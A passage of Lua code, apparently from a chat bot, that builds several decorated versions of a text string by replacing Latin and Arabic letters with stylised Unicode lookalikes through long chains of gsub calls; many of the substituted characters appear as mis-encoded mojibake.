Zhrf = Zhrf:gsub("h","π΅")
Zhrf = Zhrf:gsub("H","π")
Zhrf = Zhrf:gsub("i","πΉ")
Zhrf = Zhrf:gsub("I","π")
Zhrf = Zhrf:gsub("j","π")
Zhrf = Zhrf:gsub("J","π")
Zhrf = Zhrf:gsub("k","πΈ")
Zhrf = Zhrf:gsub("K","π")
Zhrf = Zhrf:gsub("l","πΉ")
Zhrf = Zhrf:gsub("L","π")
Zhrf = Zhrf:gsub("m","πΊ")
Zhrf = Zhrf:gsub("M","π ")
Zhrf = Zhrf:gsub("n","π»")
Zhrf = Zhrf:gsub("N","π‘")
Zhrf = Zhrf:gsub("o","πΌ")
Zhrf = Zhrf:gsub("O","π’")
Zhrf = Zhrf:gsub("p","π½")
Zhrf = Zhrf:gsub("P","π£")
Zhrf = Zhrf:gsub("q","πΎ")
Zhrf = Zhrf:gsub("Q","π€")
Zhrf = Zhrf:gsub("r","πΏ")
Zhrf = Zhrf:gsub("R","π₯")
Zhrf = Zhrf:gsub("s","π")
Zhrf = Zhrf:gsub("S","π¦")
Zhrf = Zhrf:gsub("t","π")
Zhrf = Zhrf:gsub("T","π§")
Zhrf = Zhrf:gsub("u","π")
Zhrf = Zhrf:gsub("U","π¨")
Zhrf = Zhrf:gsub("v","π")
Zhrf = Zhrf:gsub("V","π©")
Zhrf = Zhrf:gsub("w","π")
Zhrf = Zhrf:gsub("W","πͺ")
Zhrf = Zhrf:gsub("x","π")
Zhrf = Zhrf:gsub("X","π«")
Zhrf = Zhrf:gsub("y","π")
Zhrf = Zhrf:gsub("Y","π¬")
Zhrf = Zhrf:gsub("z","π")
Zhrf = Zhrf:gsub("Z","π­")



local Zhrf2 = text:gsub('ΨΆ','ΨΆΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ψ΅','Ψ΅Ω°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ψ«','Ψ«Ω°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ω','ΩΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ω','ΩΝΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('ΨΊ','ΨΊΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('ΨΉ','ΨΉΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ψ?','Ψ?ΜΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ψ­','Ψ­Ω°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ψ¬','Ψ¬Ω°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ψ΄','Ψ΄Ω°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ψ³','Ψ³Ω°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ω','ΩΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ψ¨','Ψ¨Ω°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ω','ΩΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ψ§','Ψ’')
Zhrf2 = Zhrf2:gsub('Ψͺ','ΨͺΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ω','ΩΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ω','ΩΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ω','ΪͺΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ψ·','Ψ·Ω°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('ΨΈ','ΨΈΩ°ΩΩΩΩΩ°Ω')
Zhrf2 = Zhrf2:gsub('Ψ‘','Ψ‘')
Zhrf2 = Zhrf2:gsub('Ψ€','Ψ€')
Zhrf2 = Zhrf2:gsub('Ψ±','Ψ±')
Zhrf2 = Zhrf2:gsub('Ω','Ω')
Zhrf2 = Zhrf2:gsub('Ψ²','Ψ²')
Zhrf2 = Zhrf2:gsub('Ω','ο―Μ²ΰ­­')
Zhrf2 = Zhrf2:gsub("Ω", "ΫΏΫΏΫ")
Zhrf2 = Zhrf2:gsub('a',"π")
Zhrf2 = Zhrf2:gsub('A',"π")
Zhrf2 = Zhrf2:gsub("b","π")
Zhrf2 = Zhrf2:gsub("B","π")
Zhrf2 = Zhrf2:gsub("c","π")
Zhrf2 = Zhrf2:gsub("C","π")
Zhrf2 = Zhrf2:gsub("d","π")
Zhrf2 = Zhrf2:gsub("D","π")
Zhrf2 = Zhrf2:gsub("e","π")
Zhrf2 = Zhrf2:gsub("E","π")
Zhrf2 = Zhrf2:gsub("f","π")
Zhrf2 = Zhrf2:gsub("F","π")
Zhrf2 = Zhrf2:gsub("g","π")
Zhrf2 = Zhrf2:gsub("G","π")
Zhrf2 = Zhrf2:gsub("h","π")
Zhrf2 = Zhrf2:gsub("H","π")
Zhrf2 = Zhrf2:gsub("i","π")
Zhrf2 = Zhrf2:gsub("I","π")
Zhrf2 = Zhrf2:gsub("j","π")
Zhrf2 = Zhrf2:gsub("J","π")
Zhrf2 = Zhrf2:gsub("k","π")
Zhrf2 = Zhrf2:gsub("K","π")
Zhrf2 = Zhrf2:gsub("l","π")
Zhrf2 = Zhrf2:gsub("L","π")
Zhrf2 = Zhrf2:gsub("m","π")
Zhrf2 = Zhrf2:gsub("M","π")
Zhrf2 = Zhrf2:gsub("n","π")
Zhrf2 = Zhrf2:gsub("N","π")
Zhrf2 = Zhrf2:gsub("o","π")
Zhrf2 = Zhrf2:gsub("O","π")
Zhrf2 = Zhrf2:gsub("p","π")
Zhrf2 = Zhrf2:gsub("P","π")
Zhrf2 = Zhrf2:gsub("q","π")
Zhrf2 = Zhrf2:gsub("Q","π")
Zhrf2 = Zhrf2:gsub("r","π")
Zhrf2 = Zhrf2:gsub("R","π")
Zhrf2 = Zhrf2:gsub("s","π")
Zhrf2 = Zhrf2:gsub("S","π")
Zhrf2 = Zhrf2:gsub("t","π")
Zhrf2 = Zhrf2:gsub("T","π")
Zhrf2 = Zhrf2:gsub("u","π")
Zhrf2 = Zhrf2:gsub("U","π")
Zhrf2 = Zhrf2:gsub("v","π")
Zhrf2 = Zhrf2:gsub("V","π")
Zhrf2 = Zhrf2:gsub("w","π")
Zhrf2 = Zhrf2:gsub("W","π")
Zhrf2 = Zhrf2:gsub("x","π")
Zhrf2 = Zhrf2:gsub("X","π")
Zhrf2 = Zhrf2:gsub("y","π")
Zhrf2 = Zhrf2:gsub("Y","π")
Zhrf2 = Zhrf2:gsub("z","π")
Zhrf2 = Zhrf2:gsub("Z","π")


local Zhrf3= text:gsub('ΨΆ','ΨΆ')
Zhrf3= Zhrf3:gsub('Ψ΅','Ψ΅')
Zhrf3= Zhrf3:gsub('Ψ«','Ψ«Ϋ')
Zhrf3= Zhrf3:gsub('Ω','Ω')
Zhrf3= Zhrf3:gsub('Ω','ΩΩΫ')
Zhrf3= Zhrf3:gsub('ΨΊ','ΨΊΫ')
Zhrf3= Zhrf3:gsub('ΨΉ','ΨΉΫ')
Zhrf3= Zhrf3:gsub('Ω','ΩΩ°ΫΩΩ°')
Zhrf3= Zhrf3:gsub('Ψ?','Ψ?Ϋ')
Zhrf3= Zhrf3:gsub('Ψ­','Ψ­Ϋ')
Zhrf3= Zhrf3:gsub('Ψ¬','Ψ¬Ϋ')
Zhrf3= Zhrf3:gsub('Ψ―','Ψ―')
Zhrf3= Zhrf3:gsub('Ψ°','Ψ°')
Zhrf3= Zhrf3:gsub('Ψ΄','Ψ΄Ϋ')
Zhrf3= Zhrf3:gsub('Ψ³','Ψ³Ϋ')
Zhrf3= Zhrf3:gsub('Ω','ΩΫ')
Zhrf3= Zhrf3:gsub('Ψ¨','Ψ¨Ω')
Zhrf3= Zhrf3:gsub('Ω','ΩΫ')
Zhrf3= Zhrf3:gsub('Ψ§','Ψ§')
Zhrf3= Zhrf3:gsub('Ψͺ','ΨͺΫ')
Zhrf3= Zhrf3:gsub('Ω','ΩΩ°ΫΩΩ°')
Zhrf3= Zhrf3:gsub('Ω','ΩΩ°ΫΩΩ°')
Zhrf3= Zhrf3:gsub('Ω','ΩΩΫ')
Zhrf3= Zhrf3:gsub('Ψ·','Ψ·Ϋ')
Zhrf3= Zhrf3:gsub('Ψ¦','Ψ¦ ΩΩ°')
Zhrf3= Zhrf3:gsub('Ψ‘','Ψ‘')
Zhrf3= Zhrf3:gsub('Ψ€','Ψ€')
Zhrf3= Zhrf3:gsub('Ψ±','Ψ±Ω')
Zhrf3= Zhrf3:gsub('ΩΨ§','ΩΫΨ§')
Zhrf3= Zhrf3:gsub('Ω','ΩΩ')
Zhrf3= Zhrf3:gsub('Ψ©','Ψ©')
Zhrf3= Zhrf3:gsub('Ω','Ω')
Zhrf3= Zhrf3:gsub('Ψ²','Ψ²')
Zhrf3= Zhrf3:gsub('ΨΈ','ΨΈΫΫΩ°Ω°')
Zhrf3= Zhrf3:gsub('q','κ')
Zhrf3= Zhrf3:gsub('Q','κ')
Zhrf3= Zhrf3:gsub('w','αΎ§')
Zhrf3= Zhrf3:gsub('W','αΎ§')
Zhrf3= Zhrf3:gsub('e','αΌ')
Zhrf3= Zhrf3:gsub('E','αΌ')
Zhrf3= Zhrf3:gsub('r','Κ')
Zhrf3= Zhrf3:gsub('R','Κ')
Zhrf3= Zhrf3:gsub('t','?­')
Zhrf3= Zhrf3:gsub('T','?­')
Zhrf3= Zhrf3:gsub('y','αΊ')
Zhrf3= Zhrf3:gsub('Y','αΊ')
Zhrf3= Zhrf3:gsub('u','α½')
Zhrf3= Zhrf3:gsub('i','αΌ·')
Zhrf3= Zhrf3:gsub('o','α½')
Zhrf3= Zhrf3:gsub('p','αΏ₯')
Zhrf3= Zhrf3:gsub('a','αΎ')
Zhrf3= Zhrf3:gsub('s','αΉ©')
Zhrf3= Zhrf3:gsub('d','αΈ')
Zhrf3= Zhrf3:gsub('f','?')
Zhrf3= Zhrf3:gsub('g','Κ')
Zhrf3= Zhrf3:gsub('h','Ρ')
Zhrf3= Zhrf3:gsub('j','Κ')
Zhrf3= Zhrf3:gsub('k','Ρ')
Zhrf3= Zhrf3:gsub('U','α½')
Zhrf3= Zhrf3:gsub('I','αΌ·')
Zhrf3= Zhrf3:gsub('O','α½')
Zhrf3= Zhrf3:gsub('P','αΏ₯')
Zhrf3= Zhrf3:gsub('A','αΎ')
Zhrf3= Zhrf3:gsub('S','αΉ©')
Zhrf3= Zhrf3:gsub('D','αΈ')
Zhrf3= Zhrf3:gsub('F','?')
Zhrf3= Zhrf3:gsub('G','Κ')
Zhrf3= Zhrf3:gsub('H','Ρ')
Zhrf3= Zhrf3:gsub('J','Κ')
Zhrf3= Zhrf3:gsub('K','Ρ')
Zhrf3= Zhrf3:gsub('L','Ε')
Zhrf3= Zhrf3:gsub('l','Ε')
Zhrf3= Zhrf3:gsub('z','αΊ')
Zhrf3= Zhrf3:gsub('Z','αΊ')
Zhrf3= Zhrf3:gsub('x','αΊ')
Zhrf3= Zhrf3:gsub('X','αΊ')
Zhrf3= Zhrf3:gsub('c','Ζ')
Zhrf3= Zhrf3:gsub('C','Ζ')
Zhrf3= Zhrf3:gsub('v','v')
Zhrf3= Zhrf3:gsub('V','v')
Zhrf3= Zhrf3:gsub('b','Π²')
Zhrf3= Zhrf3:gsub('B','Π²')
Zhrf3= Zhrf3:gsub('n','αΎ')
Zhrf3= Zhrf3:gsub('N','αΎ')
Zhrf3= Zhrf3:gsub('m','ΠΌ')
Zhrf3= Zhrf3:gsub('M','ΠΌ')


local Zhrf4= text:gsub('ΨΆ','ΨΆΫΫΩ°Ω°')
Zhrf4= Zhrf4:gsub('Ψ΅','ΨΆΫΫΩ°Ω°')
Zhrf4= Zhrf4:gsub('Ψ«','Ψ«ΫΩ°Ω°')
Zhrf4= Zhrf4:gsub('Ω','ΩΜ²ΰΎΫΩ°Ω°')
Zhrf4= Zhrf4:gsub('Ω','ΩΝΫΩ°Ω°')
Zhrf4= Zhrf4:gsub('ΨΊ','ΨΊΫΩ°Ω°')
Zhrf4= Zhrf4:gsub('ΨΉ','ΨΉΫΩ°Ω°')
Zhrf4= Zhrf4:gsub('Ω','ΩΩ°ΫΩΩ°')
Zhrf4= Zhrf4:gsub('Ψ?','Ψ?ΜΩ°Ϋ ')
Zhrf4= Zhrf4:gsub('Ψ­','Ψ­ΫΩ°Ω°')
Zhrf4= Zhrf4:gsub('Ψ¬','Ψ¬ΩΜ²Ω°ΩΫΫ§Ω')
Zhrf4= Zhrf4:gsub('Ψ―','Ψ―Ω°')
Zhrf4= Zhrf4:gsub('Ψ°','Ψ°Ω°Ω')
Zhrf4= Zhrf4:gsub('Ψ΄','Ψ΄ΩΩ°ΫΩ°Ω°')
Zhrf4= Zhrf4:gsub('Ψ³','Ψ³ΩΩ°')
Zhrf4= Zhrf4:gsub('Ω','ΩΩΩ°Ϋ')
Zhrf4= Zhrf4:gsub('Ψ¨','Ψ¨ΩΫ')
Zhrf4= Zhrf4:gsub('Ω','ΩΩΜ²Ω°ΩΫ')
Zhrf4= Zhrf4:gsub('Ψ§','Ψ’')
Zhrf4= Zhrf4:gsub('Ψͺ','ΨͺΩΫΩΩ°')
Zhrf4= Zhrf4:gsub('Ω','ΩΩΩΫ')
Zhrf4= Zhrf4:gsub('Ω','ΩΩ°Μ²Ϋ')
Zhrf4= Zhrf4:gsub('Ω','ΪͺΩ°ΰΎΫΩ°Ω°')
Zhrf4= Zhrf4:gsub('Ψ·','Ψ·Ϋ¨ΫΩ°Ω°')
Zhrf4= Zhrf4:gsub('Ψ¦','Ψ¦ ΩΩ°')
Zhrf4= Zhrf4:gsub('Ψ‘','Ψ‘')
Zhrf4= Zhrf4:gsub('Ψ€','Ψ€')
Zhrf4= Zhrf4:gsub('Ψ±','Ψ±Ω')
Zhrf4= Zhrf4:gsub('ΩΨ§','ΩΫΨ§')
Zhrf4= Zhrf4:gsub('Ω','ΩΩ')
Zhrf4= Zhrf4:gsub('Ψ©','Ψ©')
Zhrf4= Zhrf4:gsub('Ω','ΩΩ°Ω')
Zhrf4= Zhrf4:gsub('Ψ²','Ψ²Ω°Ω')
Zhrf4= Zhrf4:gsub('ΨΈ','ΨΈΫΫΩ°Ω°')
Zhrf4= Zhrf4:gsub('q','β')
Zhrf4= Zhrf4:gsub('Q','β')
Zhrf4= Zhrf4:gsub('w','π')
Zhrf4= Zhrf4:gsub('W','π')
Zhrf4= Zhrf4:gsub('e','πΌ')
Zhrf4= Zhrf4:gsub('E','πΌ')
Zhrf4= Zhrf4:gsub('r','β')
Zhrf4= Zhrf4:gsub('R','β')
Zhrf4= Zhrf4:gsub('t','π')
Zhrf4= Zhrf4:gsub('T','π')
Zhrf4= Zhrf4:gsub('y','π')
Zhrf4= Zhrf4:gsub('Y','π')
Zhrf4= Zhrf4:gsub('u','π')
Zhrf4= Zhrf4:gsub('i','π')
Zhrf4= Zhrf4:gsub('o','π')
Zhrf4= Zhrf4:gsub('p','β')
Zhrf4= Zhrf4:gsub('a','πΈ')
Zhrf4= Zhrf4:gsub('s','π')
Zhrf4= Zhrf4:gsub('d','π»')
Zhrf4= Zhrf4:gsub('f','π½')
Zhrf4= Zhrf4:gsub('g','πΎ')
Zhrf4= Zhrf4:gsub('h','β')
Zhrf4= Zhrf4:gsub('j','π')
Zhrf4= Zhrf4:gsub('k','π')
Zhrf4= Zhrf4:gsub('U','π')
Zhrf4= Zhrf4:gsub('I','π')
Zhrf4= Zhrf4:gsub('O','π')
Zhrf4= Zhrf4:gsub('P','β')
Zhrf4= Zhrf4:gsub('A','πΈ')
Zhrf4= Zhrf4:gsub('S','π')
Zhrf4= Zhrf4:gsub('D','π»')
Zhrf4= Zhrf4:gsub('F','π½')
Zhrf4= Zhrf4:gsub('G','πΎ')
Zhrf4= Zhrf4:gsub('H','β')
Zhrf4= Zhrf4:gsub('J','π')
Zhrf4= Zhrf4:gsub('K','π')
Zhrf4= Zhrf4:gsub('L','π')
Zhrf4= Zhrf4:gsub('l','π')
Zhrf4= Zhrf4:gsub('z','β€')
Zhrf4= Zhrf4:gsub('Z','β€')
Zhrf4= Zhrf4:gsub('x','π')
Zhrf4= Zhrf4:gsub('X','π')
Zhrf4= Zhrf4:gsub('c','β')
Zhrf4= Zhrf4:gsub('C','β')
Zhrf4= Zhrf4:gsub('v','π')
Zhrf4= Zhrf4:gsub('V','π')
Zhrf4= Zhrf4:gsub('b','πΉ')
Zhrf4= Zhrf4:gsub('B','πΉ')
Zhrf4= Zhrf4:gsub('n','β')
Zhrf4= Zhrf4:gsub('N','β')
Zhrf4= Zhrf4:gsub('m','π')
Zhrf4= Zhrf4:gsub('M','π')



local Zhrf5= text:gsub('ΨΆ','ΨΆΩ')
Zhrf5= Zhrf5:gsub('Ψ΅','Ψ΅Ω')
Zhrf5= Zhrf5:gsub('Ψ«','Ψ«Ω')
Zhrf5= Zhrf5:gsub('Ω','ΩΩ')
Zhrf5= Zhrf5:gsub('Ω','ΩΩ')
Zhrf5= Zhrf5:gsub('ΨΊ','ΨΊΩ')
Zhrf5= Zhrf5:gsub('ΨΉ','ΨΉΩ')
Zhrf5= Zhrf5:gsub('Ω','ο?­')
Zhrf5= Zhrf5:gsub('Ψ?','Ψ?Ω')
Zhrf5= Zhrf5:gsub('Ψ­','Ψ­Ω')
Zhrf5= Zhrf5:gsub('Ψ¬','Ψ¬Ω')
Zhrf5= Zhrf5:gsub('Ψ―','Ψ―Ω')
Zhrf5= Zhrf5:gsub('Ψ°','Ψ°Ω')
Zhrf5= Zhrf5:gsub('Ψ΄','Ψ΄Ω')
Zhrf5= Zhrf5:gsub('Ψ³','Ψ³Ω')
Zhrf5= Zhrf5:gsub('Ω','ΩΩ')
Zhrf5= Zhrf5:gsub('Ψ¨','Ψ¨Ω')
Zhrf5= Zhrf5:gsub('Ω','ΩΩ')
Zhrf5= Zhrf5:gsub('Ψ§','Ψ£Ω')
Zhrf5= Zhrf5:gsub('Ψͺ','ΨͺΩ')
Zhrf5= Zhrf5:gsub('Ω','ΩΩ')
Zhrf5= Zhrf5:gsub('Ω','ΩΩ')
Zhrf5= Zhrf5:gsub('Ω','Ϊ³Ω')
Zhrf5= Zhrf5:gsub('Ψ·','Ψ·Ω')
Zhrf5= Zhrf5:gsub('Ψ¦','Ψ¦')
Zhrf5= Zhrf5:gsub('Ψ‘','Ψ‘')
Zhrf5= Zhrf5:gsub('Ψ€','Ψ€')
Zhrf5= Zhrf5:gsub('Ψ±','Ψ±Ω')
Zhrf5= Zhrf5:gsub('ΩΨ§','ΩΩΨ£Ω')
Zhrf5= Zhrf5:gsub('Ω','Ω')
Zhrf5= Zhrf5:gsub('Ψ©','Ψ©Ω')
Zhrf5= Zhrf5:gsub('Ω','ΩΩ')
Zhrf5= Zhrf5:gsub('Ψ²','Ψ²Ω')
Zhrf5= Zhrf5:gsub('ΨΈ','ΨΈ')
Zhrf5= Zhrf5:gsub('q','Ζ')
Zhrf5= Zhrf5:gsub('Q','Ζ')
Zhrf5= Zhrf5:gsub('w','w')
Zhrf5= Zhrf5:gsub('W','w')
Zhrf5= Zhrf5:gsub('e','Γ')
Zhrf5= Zhrf5:gsub('E','Γ')
Zhrf5= Zhrf5:gsub('r','r')
Zhrf5= Zhrf5:gsub('R','r')
Zhrf5= Zhrf5:gsub('t','β₯')
Zhrf5= Zhrf5:gsub('T','β₯')
Zhrf5= Zhrf5:gsub('y','Γ½')
Zhrf5= Zhrf5:gsub('Y','Γ½')
Zhrf5= Zhrf5:gsub('u','Β΅')
Zhrf5= Zhrf5:gsub('U','Β΅')
Zhrf5= Zhrf5:gsub('i','Γ')
Zhrf5= Zhrf5:gsub('I','Γ')
Zhrf5= Zhrf5:gsub('o','β')
Zhrf5= Zhrf5:gsub('O','β')
Zhrf5= Zhrf5:gsub('p','Η·')
Zhrf5= Zhrf5:gsub('P','Η·')
Zhrf5= Zhrf5:gsub('a','Βͺ')
Zhrf5= Zhrf5:gsub('A','Βͺ')
Zhrf5= Zhrf5:gsub('s','S')
Zhrf5= Zhrf5:gsub('S','S')
Zhrf5= Zhrf5:gsub('d','Γ')
Zhrf5= Zhrf5:gsub('D','Γ')
Zhrf5= Zhrf5:gsub('f','F')
Zhrf5= Zhrf5:gsub('F','F')
Zhrf5= Zhrf5:gsub('g','ΰ«¬')
Zhrf5= Zhrf5:gsub('G','ΰ«¬')
Zhrf5= Zhrf5:gsub('h','Ι§')
Zhrf5= Zhrf5:gsub('H','Ι§')
Zhrf5= Zhrf5:gsub('j','j')
Zhrf5= Zhrf5:gsub('J','j')
Zhrf5= Zhrf5:gsub('L','Δ»')
Zhrf5= Zhrf5:gsub('l','Δ»')
Zhrf5= Zhrf5:gsub('z','z')
Zhrf5= Zhrf5:gsub('Z','z')
Zhrf5= Zhrf5:gsub('x','Γ')
Zhrf5= Zhrf5:gsub('X','Γ')
Zhrf5= Zhrf5:gsub('c','Β’')
Zhrf5= Zhrf5:gsub('C','Β’')
Zhrf5= Zhrf5:gsub('v','β')
Zhrf5= Zhrf5:gsub('V','β')
Zhrf5= Zhrf5:gsub('b','b')
Zhrf5= Zhrf5:gsub('B','b')
Zhrf5= Zhrf5:gsub('n','Ξ·')
Zhrf5= Zhrf5:gsub('N','Ξ·')
Zhrf5= Zhrf5:gsub('m','ΠΌ')
Zhrf5= Zhrf5:gsub('M','ΠΌ')



local Zhrf6= text:gsub('ΨΆ','οΊΏΝ Μ­')
Zhrf6= Zhrf6:gsub('Ψ΅','οΊ»Ν‘')
Zhrf6= Zhrf6:gsub('Ψ«','οΊΜ²')
Zhrf6= Zhrf6:gsub('Ω','ο­°')
Zhrf6= Zhrf6:gsub('Ω','ο»Μ²')
Zhrf6= Zhrf6:gsub('ΨΊ','ο»Μ²')
Zhrf6= Zhrf6:gsub('ΨΉ','ο»Μ²')
Zhrf6= Zhrf6:gsub('Ω','ο?¬ΜΜ²')
Zhrf6= Zhrf6:gsub('Ψ?','Ψ?Ω')
Zhrf6= Zhrf6:gsub('Ψ­','οΊ£Μ')
Zhrf6= Zhrf6:gsub('Ψ¬','Ψ¬Ω')
Zhrf6= Zhrf6:gsub('Ψ―','ΪΜ')
Zhrf6= Zhrf6:gsub('Ψ°','Ψ°Ω')
Zhrf6= Zhrf6:gsub('Ψ΄','οΊ·Μ²')
Zhrf6= Zhrf6:gsub('Ψ³','οΊ³Μ')
Zhrf6= Zhrf6:gsub('Ω','ο―ΎΜΜ')
Zhrf6= Zhrf6:gsub('Ψ¨','οΊΜ²')
Zhrf6= Zhrf6:gsub('Ω','Ψ§Μο»')
Zhrf6= Zhrf6:gsub('Ψ§','οΊΜ')
Zhrf6= Zhrf6:gsub('Ψͺ','ΩΌΩ')
Zhrf6= Zhrf6:gsub('Ω','ο»§Μ²')
Zhrf6= Zhrf6:gsub('Ω','ο»£ΜΜ²')
Zhrf6= Zhrf6:gsub('Ω','Ϊ―')
Zhrf6= Zhrf6:gsub('Ψ·','ο»Μ²')
Zhrf6= Zhrf6:gsub('Ψ¦',' ΩΩ°Ψ¦')
Zhrf6= Zhrf6:gsub('Ψ‘','Ψ‘')
Zhrf6= Zhrf6:gsub('Ψ€','Ψ€')
Zhrf6= Zhrf6:gsub('Ψ±','ΫΪ')
Zhrf6= Zhrf6:gsub('ΩΨ§','ο»Μ²οΊΜ²')
Zhrf6= Zhrf6:gsub('Ω','Ω')
Zhrf6= Zhrf6:gsub('Ψ©','Ψ©')
Zhrf6= Zhrf6:gsub('Ω','ΫΫΫ')
Zhrf6= Zhrf6:gsub('Ψ²','Ψ²Ω')
Zhrf6= Zhrf6:gsub('ΨΈ','ο»Μ²')
Zhrf6= Zhrf6:gsub('q','α³')
Zhrf6= Zhrf6:gsub('Q','α³')
Zhrf6= Zhrf6:gsub('w','Π¨')
Zhrf6= Zhrf6:gsub('W','Π¨')
Zhrf6= Zhrf6:gsub('e','Ξ£')
Zhrf6= Zhrf6:gsub('E','Ξ£')
Zhrf6= Zhrf6:gsub('r','Ξ')
Zhrf6= Zhrf6:gsub('R','Ξ')
Zhrf6= Zhrf6:gsub('t','Ζ¬')
Zhrf6= Zhrf6:gsub('T','Ζ¬')
Zhrf6= Zhrf6:gsub('y','Ξ¨')
Zhrf6= Zhrf6:gsub('Y','Ξ¨')
Zhrf6= Zhrf6:gsub('u','Ζ±')
Zhrf6= Zhrf6:gsub('U','Ζ±')
Zhrf6= Zhrf6:gsub('i','I')
Zhrf6= Zhrf6:gsub('I','I')
Zhrf6= Zhrf6:gsub('o','Ξ')
Zhrf6= Zhrf6:gsub('O','Ξ')
Zhrf6= Zhrf6:gsub('p','Ζ€')
Zhrf6= Zhrf6:gsub('P','Ζ€')
Zhrf6= Zhrf6:gsub('a','Ξ')
Zhrf6= Zhrf6:gsub('A','Ξ')
Zhrf6= Zhrf6:gsub('s','Π')
Zhrf6= Zhrf6:gsub('S','Π')
Zhrf6= Zhrf6:gsub('d','D')
Zhrf6= Zhrf6:gsub('D','D')
Zhrf6= Zhrf6:gsub('f','F')
Zhrf6= Zhrf6:gsub('F','F')
Zhrf6= Zhrf6:gsub('g','G')
Zhrf6= Zhrf6:gsub('G','G')
Zhrf6= Zhrf6:gsub('h','H')
Zhrf6= Zhrf6:gsub('H','H')
Zhrf6= Zhrf6:gsub('j','J')
Zhrf6= Zhrf6:gsub('J','J')
Zhrf6= Zhrf6:gsub('L','L')
Zhrf6= Zhrf6:gsub('l','L')
Zhrf6= Zhrf6:gsub('z','Z')
Zhrf6= Zhrf6:gsub('Z','Z')
Zhrf6= Zhrf6:gsub('x','Π')
Zhrf6= Zhrf6:gsub('X','Π')
Zhrf6= Zhrf6:gsub('c','C')
Zhrf6= Zhrf6:gsub('C','C')
Zhrf6= Zhrf6:gsub('v','Ζ²')
Zhrf6= Zhrf6:gsub('V','Ζ²')
Zhrf6= Zhrf6:gsub('b','Ζ')
Zhrf6= Zhrf6:gsub('B','Ζ')
Zhrf6= Zhrf6:gsub('n','β')
Zhrf6= Zhrf6:gsub('N','β')
Zhrf6= Zhrf6:gsub('m','Ξ')
Zhrf6= Zhrf6:gsub('M','Ξ')



local Zhrf7= text:gsub('ΨΆ','οΊΏ')
Zhrf7= Zhrf7:gsub('Ψ΅','οΊ»')
Zhrf7= Zhrf7:gsub('Ψ«','ο­₯')
Zhrf7= Zhrf7:gsub('Ω','ο»Μ?ΩΜ')
Zhrf7= Zhrf7:gsub('Ω','ο­¬')
Zhrf7= Zhrf7:gsub('ΨΊ','ο»ΜΜ£')
Zhrf7= Zhrf7:gsub('ΨΉ','ο»')
Zhrf7= Zhrf7:gsub('Ω','ΪΎΩΫΩ')
Zhrf7= Zhrf7:gsub('Ψ?','οΊ§')
Zhrf7= Zhrf7:gsub('Ψ­','Χ€')
Zhrf7= Zhrf7:gsub('Ψ¬','ο­΄')
Zhrf7= Zhrf7:gsub('Ψ―','ο?')
Zhrf7= Zhrf7:gsub('Ψ°','Ψ°')
Zhrf7= Zhrf7:gsub('Ψ΄','οΊ·')
Zhrf7= Zhrf7:gsub('Ψ³','οΊ³')
Zhrf7= Zhrf7:gsub('Ω','ο―Ύ')
Zhrf7= Zhrf7:gsub('Ψ¨','οΊ')
Zhrf7= Zhrf7:gsub('Ω','ο»')
Zhrf7= Zhrf7:gsub('Ψ§','οΊ')
Zhrf7= Zhrf7:gsub('Ψͺ','ο­ ')
Zhrf7= Zhrf7:gsub('Ω','ο»§')
Zhrf7= Zhrf7:gsub('Ω','ο»£ΜΜ')
Zhrf7= Zhrf7:gsub('Ω','Ϊ―Ω')
Zhrf7= Zhrf7:gsub('Ψ·','ο»Ω')
Zhrf7= Zhrf7:gsub('Ψ¦','Ω°Ψ¦Ω')
Zhrf7= Zhrf7:gsub('Ψ‘','Ψ‘')
Zhrf7= Zhrf7:gsub('Ψ€','ο―')
Zhrf7= Zhrf7:gsub('Ψ±','ΪΩ')
Zhrf7= Zhrf7:gsub('ΩΨ§','ο»Ψ’')
Zhrf7= Zhrf7:gsub('Ω','Ωο?―')
Zhrf7= Zhrf7:gsub('Ψ©','Ψ©')
Zhrf7= Zhrf7:gsub('Ω','Ϋ')
Zhrf7= Zhrf7:gsub('Ψ²','Ϊ')
Zhrf7= Zhrf7:gsub('ΨΈ','ο»')
Zhrf7= Zhrf7:gsub('q','ΰΉ')
Zhrf7= Zhrf7:gsub('Q','ΰΉ')
Zhrf7= Zhrf7:gsub('w','ΰΊ')
Zhrf7= Zhrf7:gsub('W','ΰΊ')
Zhrf7= Zhrf7:gsub('e','Δ')
Zhrf7= Zhrf7:gsub('E','Δ')
Zhrf7= Zhrf7:gsub('r','r')
Zhrf7= Zhrf7:gsub('R','r')
Zhrf7= Zhrf7:gsub('t','t')
Zhrf7= Zhrf7:gsub('T','t')
Zhrf7= Zhrf7:gsub('y','ΰΈ―')
Zhrf7= Zhrf7:gsub('Y','ΰΈ―')
Zhrf7= Zhrf7:gsub('u','ΰΈ')
Zhrf7= Zhrf7:gsub('U','ΰΈ')
Zhrf7= Zhrf7:gsub('i','i')
Zhrf7= Zhrf7:gsub('I','i')
Zhrf7= Zhrf7:gsub('o','ΰ»')
Zhrf7= Zhrf7:gsub('O','ΰ»')
Zhrf7= Zhrf7:gsub('p','p')
Zhrf7= Zhrf7:gsub('P','p')
Zhrf7= Zhrf7:gsub('a','ΰΈ')
Zhrf7= Zhrf7:gsub('A','ΰΈ')
Zhrf7= Zhrf7:gsub('s','Ε')
Zhrf7= Zhrf7:gsub('S','Ε')
